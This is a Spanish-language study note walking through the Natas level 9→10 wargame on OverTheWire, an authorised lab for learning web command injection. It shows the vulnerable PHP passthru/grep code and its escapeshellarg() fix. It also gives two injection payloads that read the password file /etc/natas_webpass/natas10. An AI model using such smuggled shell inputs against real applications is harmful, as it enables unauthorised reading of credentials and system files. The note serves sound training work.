---
title: Natas Nivel 9 a 10
date: 2026-06-14
tags: [ciberseguridad, web, owasp, natas, command-injection, wargame]
type: nota
status: en-progreso
source: claude-code
aliases: [Natas 9-10, natas nivel 9, command injection grep passthru]
---

# Natas Nivel 9 → 10

Nivel del wargame **Natas** de [OverTheWire](https://overthewire.org/wargames/natas/), un laboratorio legal y autorizado diseñado para aprender seguridad web ofensiva de forma progresiva.

Nivel oficial: https://overthewire.org/wargames/natas/natas10.html

---

## Objetivo

Obtener la contraseña de natas10, almacenada en `/etc/natas_webpass/natas10`, explotando un buscador de palabras que concatena la entrada del usuario directamente en un comando de shell sin ningún tipo de saneamiento.

---

## Qué aprendes

| Concepto / Herramienta | Para qué sirve |
|---|---|
| **Command Injection** | Inyectar comandos de SO en una aplicación que concatena input en llamadas al shell |
| `passthru()` (PHP) | Ejecuta un comando del sistema y vuelca su salida cruda al navegador |
| `grep` como vector | `grep PATRON FICHERO` — si controlamos PATRON o FICHERO, controlamos qué lee el proceso |
| Metacaracteres de shell | `;` separa comandos, `#` comenta el resto de la línea |
| `/etc/natas_webpass/natasN` | Convención de Natas: cada contraseña vive en ese fichero, legible solo por el usuario natasN |

### Concepto clave

**Command Injection** es una vulnerabilidad de la categoría *Injection* (OWASP Top 10 A03). Ocurre cuando una aplicación construye un comando de sistema operativo concatenando datos controlados por el usuario sin escaparlos ni validarlos. El proceso del servidor ejecuta el comando con sus propios privilegios, por lo que el atacante hereda esos permisos.

Patron general:

```
comando_fijo + INPUT_USUARIO + resto_fijo
```

Si `INPUT_USUARIO` contiene metacaracteres de shell (`;`, `|`, `&&`, `$(...)`, `` ` ``), el intérprete los procesa como separadores o sustituciones, ejecutando comandos adicionales.

En este nivel, el código PHP vulnerable es equivalente a:

```php
passthru('grep -i ' . $key . ' dictionary.txt');
```

`$key` viene directamente del campo de búsqueda del formulario. No hay `escapeshellarg()`, `escapeshellcmd()` ni ninguna lista blanca.

---

## Paso a paso

### 1. Autenticarse en natas9

Abre el navegador y navega a:

```
http://natas9.natas.labs.overthewire.org
```

Usuario: `natas9`
Contraseña: `<pass_natas9>` (la que obtuviste en el nivel anterior)

Verás un formulario con un campo de texto y un botón "Search".

### 2. Entender el código fuente

El nivel muestra el código PHP directamente. La línea crítica:

```php
passthru('grep -i ' . $key . ' dictionary.txt');
```

Con una búsqueda legítima como `hello`, el comando que se ejecuta en el servidor es:

```bash
grep -i hello dictionary.txt
```

Con entrada maliciosa, podemos alterar ese comando.

### 3. Técnica A — Separador de comandos con `;`

Introduce en el campo de búsqueda:

```
; cat /etc/natas_webpass/natas10 ;
```

El comando resultante en el servidor es:

```bash
grep -i ; cat /etc/natas_webpass/natas10 ; dictionary.txt
```

El shell interpreta los `;` como separadores de comandos. `grep -i` falla (sin argumentos), pero `cat /etc/natas_webpass/natas10` se ejecuta y su salida aparece en la página.

### 4. Técnica B — Usar `grep` para leer el fichero de contraseña (más limpio)

Esta técnica no necesita separadores; abusa de que `grep` acepta múltiples ficheros como argumentos:

```
. /etc/natas_webpass/natas10
```

El punto `.` es un patrón de regex que coincide con cualquier carácter. El comando resultante:

```bash
grep -i . /etc/natas_webpass/natas10 dictionary.txt
```

`grep` lee **ambos ficheros**. Como el patrón `.` coincide con todo, imprime cada línea de `/etc/natas_webpass/natas10` (la contraseña) seguida de las líneas del diccionario.

> Esta segunda técnica es preferible en entornos donde el shell filtra `;` pero no valida el número de argumentos de `grep`.

### 5. Leer la contraseña en la respuesta

La página muestra la salida del comando. Localiza la cadena de ~32 caracteres alfanuméricos: esa es `<pass_natas10>`.

---

## Por qué funciona

`passthru()` es una función PHP que pasa el comando al shell del sistema operativo y vuelca la salida sin procesarla. El proceso PHP hereda los permisos del usuario de servidor web (`www-data` o similar), que en Natas tiene permiso de lectura sobre `/etc/natas_webpass/natas10`.

Al no haber ninguna llamada a `escapeshellarg()` (que encapsularía el input entre comillas simples escapadas), el shell recibe los metacaracteres tal cual y los interpreta. Es exactamente el comportamiento descrito en **CWE-78: OS Command Injection**.

Diagrama del flujo:

```
Formulario → $key → 'grep -i ' . $key . ' dictionary.txt' → passthru() → shell → salida al browser
```

El fix correcto sería:

```php
passthru('grep -i ' . escapeshellarg($key) . ' dictionary.txt');
```

`escapeshellarg()` envuelve el valor en comillas simples y escapa cualquier comilla interna, haciendo imposible la inyección de metacaracteres.

---

## Errores comunes

**Olvidar los espacios alrededor del payload**: `; cat /etc/natas_webpass/natas10 ;` necesita espacio antes del primer `;` para que no se pegue al argumento de `grep`. Sin el espacio inicial, `grep -i;` puede fallar de forma inesperada.

**Confundir la salida**: la Técnica B mezcla la contraseña con miles de líneas del diccionario. Busca la línea que aparece antes de la primera palabra del diccionario, o filtra visualmente por longitud (~32 caracteres sin espacios).

**Usar comillas simples en el payload vía URL**: si mandas el payload por la barra de URL directamente en lugar del formulario, algunos caracteres necesitan codificación URL (`;` → `%3B`). Usa siempre el formulario de la página para este nivel.

**Asumir que el nivel siguiente tiene la misma vulnerabilidad**: natas10 añade una lista negra que bloquea `;`, `|` y `&`. La Técnica B (pasar el fichero como argumento a `grep`) sí funciona allí, pero `;` ya no.

---

## Pasar al siguiente nivel

Con `<pass_natas10>` en mano, navega a:

```
http://natas10.natas.labs.overthewire.org
```

Usuario: `natas10`
Contraseña: `<pass_natas10>`

---

## Conexiones

- [[Natas/00_README]] — índice general del wargame Natas y cómo empezar
- [[MOC_Ciberseguridad]] — mapa de contenidos de ciberseguridad en la bóveda
- [[04-seguridad-web-owasp]] — contexto OWASP Top 10 y categoría Injection (A03)
- [[13-herramientas-en-detalle]] — referencia de `grep`, metacaracteres de shell y `passthru`
